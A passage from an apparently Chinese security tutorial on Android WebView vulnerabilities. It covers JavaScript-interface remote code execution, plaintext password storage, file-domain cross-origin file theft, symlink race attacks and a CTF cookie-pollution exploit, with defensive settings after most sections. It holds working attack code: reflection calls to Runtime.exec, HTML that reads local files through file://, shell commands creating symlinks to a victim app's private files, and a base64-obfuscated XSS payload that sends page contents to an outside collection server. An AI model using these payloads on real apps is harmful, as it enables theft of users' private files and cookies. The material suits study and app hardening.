(<span class="keyword">var</span> obj in window) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123;  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);          </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>漏洞防护：</strong></p>
<p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用，如我们上文中实现的便是如此</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/30.png" alt="image-20220729164533455"></p>
<p>后来这种漏洞越来越少，在当前高版本的手机上基本没有了</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/31.png" alt="image-20220729164656332"></p>
<p>在4.2之前，可以采用拦截prompt（）的方式进行漏洞修复，不过这种版本太过久远，所以我们这里就不细讲了</p>
<h5 id="lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞"><a href="#lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞" class="headerlink" title="&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞"></a>&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p>
<p>在Android 3.0以下，Android系统会默认通过<code>searchBoxJavaBridge_</code>的Js接口给 WebView 添加一个JS映射对象：<code>searchBoxJavaBridge_</code>对象，该接口可能被利用，实现远程任意代码。</p>
<p><strong>安全防护：</strong></p>
<p>删除<code>searchBoxJavaBridge_</code>接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过调用该方法删除接口</span></span><br><span class="line">removeJavascriptInterface（）;</span><br></pre></td></tr></table></figure>

<p>而<code>accessibility</code>和 <code>accessibilityTraversal</code>接口引起远程代码执行漏洞的原理和这里相似，由于这些漏洞在当前的Android版本上基本不存在，我们不做深入讲解了。</p>
<h4 id="（2）WebView明文存储漏洞"><a href="#（2）WebView明文存储漏洞" class="headerlink" title="（2）WebView明文存储漏洞"></a>（2）WebView明文存储漏洞</h4><p><strong>漏洞原理：</strong></p>
<p>WebView默认开启密码保存功能 ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure>

<p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p>
<p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p>
<p><strong>安全防护：</strong></p>
<p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p>
<h3 id="2-跨域漏洞"><a href="#2-跨域漏洞" class="headerlink" title="2.跨域漏洞"></a>2.跨域漏洞</h3><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)，漏洞产生的原因在Android系统中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p>
<p>针对WebView的跨域问题，主要是三个重要的API，如下所示：</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>作用&#x2F;风险</strong></th>
<th><strong>默认策略</strong></th>
</tr>
</thead>
<tbody><tr>
<td>setAllowFileAccess(true);</td>
<td>设置是否允许 WebView 使用 File 协议</td>
<td>默认设置为 true</td>
</tr>
<tr>
<td>setAllowFileAccessFromFileURLs(true);</td>
<td>设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件</td>
<td>在 Android 4.1 后默认禁止</td>
</tr>
<tr>
<td>setAllowUniversalAccessFromFileURLs(true);</td>
<td>设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源)</td>
<td>在 Android 4.1 后默认禁止</td>
</tr>
<tr>
<td>setJavaScriptEnabled(true);</td>
<td>设置是否允许 WebView 使用 JavaScript</td>
<td>默认不允许</td>
</tr>
</tbody></table>
<h4 id="（1）任意文件窃取1（应用克隆漏洞）"><a href="#（1）任意文件窃取1（应用克隆漏洞）" class="headerlink" title="（1）任意文件窃取1（应用克隆漏洞）"></a>（1）任意文件窃取1（应用克隆漏洞）</h4><p><strong>漏洞原理：</strong></p>
<p><code>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</code></p>
<p>这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML&#x2F;JS，并窃取相关的私有文件信息</p>
<p><strong>漏洞复现：</strong></p>
<p>首先我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/37.png" alt="image-20220729195648955"></p>
<p>我们怎么利用WebView的跨域漏洞去访问本地的私有目录</p>
<p>首先我们编写目标JS文件：</p>
<p>fileAttack.html</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function <span class="title function_">loadXMLDoc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">arm</span> <span class="operator">=</span> <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              console.log(xmlhttp.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我们将文件上传到手机的目录</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/38.png" alt="image-20220729200249055"></p>
<p>接着我们编写攻击脚本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这是程序肯定会报错误，因为Android4.1后就默认禁止<code>setAllowFileAccessFromFileURLs(true)</code></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/39.png" alt="image-20220729200625192"></p>
<p>然后我们开启<code>setAllowFileAccessFromFileURLs</code>按钮，再次执行</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/40.png" alt="image-20220729200745980"></p>
<p>我们可以发现现在的Android版本中开始删除了这样的API，这是为了安全性，不过这里我们还是可以使用，于是我们开启API</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/41.png" alt="image-20220729201027637"></p>
<p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p>
<h4 id="（2）通用协议漏洞-（恶意页面注入）"><a href="#（2）通用协议漏洞-（恶意页面注入）" class="headerlink" title="（2）通用协议漏洞 （恶意页面注入）"></a>（2）通用协议漏洞 （恶意页面注入）</h4><p><strong>漏洞原理：</strong></p>
<p><code>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</code></p>
<p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p>
<p>我们将上面html中的访问改为看雪的网站：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xmlhttp;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">loadXMLDoc</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/42.png" alt="image-20220729202020754"></p>
<p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p>
<p><strong>安全防护:</strong></p>
<ul>
<li>检查应用是否使用了 webview 控件；</li>
<li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li>
<li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li>
</ul>
<p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p>
<ul>
<li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:&#x2F;&#x2F;&#x2F;android_asset 和 file:&#x2F;&#x2F;&#x2F;android_res 在不开启 API 的情况下也可以访问；</li>
<li>可能会更新的 HTML 文件放在 &#x2F;data&#x2F;data&#x2F;(app) 目录下，避免被第三方替换或修改；</li>
<li>对 file 域请求做白名单限制时，需要对“…&#x2F;…&#x2F;”特殊情况进行处理，避免白名单被绕过。</li>
</ul>
<h4 id="（3）符号链接跨源攻击"><a href="#（3）符号链接跨源攻击" class="headerlink" title="（3）符号链接跨源攻击"></a>（3）符号链接跨源攻击</h4><p>我们回顾2020SDC中研究提到的这类漏洞，只有<strong>setAllowFileAccess为True</strong></p>
<p><strong>漏洞原理：</strong></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/43.png" alt="image-20220729202532795"></p>
<p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p>
<p>具体攻击步骤:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。）</span><br><span class="line"><span class="number">1.</span> 把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；\</span><br><span class="line"><span class="number">2.</span> 修改后休眠 1s，让文件操作完成；\</span><br><span class="line"><span class="number">3.</span> 完成后通过系统的 Chrome 应用去打开该 xx.html 文件\</span><br><span class="line"><span class="number">4.</span> 等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接，\</span><br><span class="line">于是就可通过链接来访问 Chrome 的 Cookie</span><br></pre></td></tr></table></figure>

<p><strong>漏洞复现：</strong></p>
<p>这里由于该漏洞在Android7.0版本上已经修复了，所以这里我引用大佬的博客来进行描述，大家具体可以按照步骤在Android7.0以下的版本上去复现，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p>
<p>构造HTML文件：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意<span class="variable constant_">APP</span>的<span class="variable constant_">HTML</span>,被检测<span class="variable constant_">APP</span>加载此html，执行<span class="variable constant_">JS</span>代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">var d = document;</span></span><br><span class="line"><span class="language-xml">function loadDatabase()</span></span><br><span class="line"><span class="language-xml">&#123;</span></span><br><span class="line"><span class="language-xml">    var file_url = d.URL;</span></span><br><span class="line"><span class="language-xml">    var xmlhttp =new XMLHttpRequest();</span></span><br><span class="line"><span class="language-xml">    xmlhttp.onload=function() &#123;</span></span><br><span class="line"><span class="language-xml"> 		document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span></span><br><span class="line"><span class="language-xml">    	alert(xmlhttp.responseText);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">    xmlhttp.open(&quot;GET&quot;,file_url);</span></span><br><span class="line"><span class="language-xml">    xmlhttp.send(null);</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>构造恶意APP的攻击代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">  		<span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">  		#新建文件夹，用于存放恶意HTML文件</span><br><span class="line">       	cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">       	#将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目标样本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现效果：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729205923022"></p>
<p><strong>安全防护：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、设置setAllowFileAccess方法为<span class="literal">false</span>,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line"><span class="number">2</span>、在Android4<span class="number">.0</span>(API15)及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line"><span class="number">3</span>、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure>

<h4 id="（4）污染Cooike漏洞"><a href="#（4）污染Cooike漏洞" class="headerlink" title="（4）污染Cooike漏洞"></a>（4）污染Cooike漏洞</h4><p>本漏洞参考：<a target="_blank" rel="noopener" href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/44.png" alt="image-20220729210229976"></p>
<p><strong>漏洞原理：</strong></p>
<p>攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/74.png" alt="image-20220730141203355"></p>
<p><strong>漏洞复现：</strong></p>
<p>首先创建了符号链接，然后过URL校验，访问我们的服务器<code>http://ip地址/easydroid.html</code>:</p>
<p>建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件</p>
<p><code>easydroid.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>injected cookie with xss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;sendData = &#x27;&lt;img src=\&quot;evil\&quot; onerror=\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> baseUrl = <span class="string">&quot;http://****/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;open evil page.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">     <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">         location.<span class="property">href</span> = <span class="string">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">     &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    symlink();</span><br><span class="line">    Intent intent \= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">    intent.setData(Uri.parse(<span class="string">&quot;http://toutiao.com@****/easydroid.html&quot;</span>));</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">symlink</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    String root \= getApplicationInfo().dataDir;</span><br><span 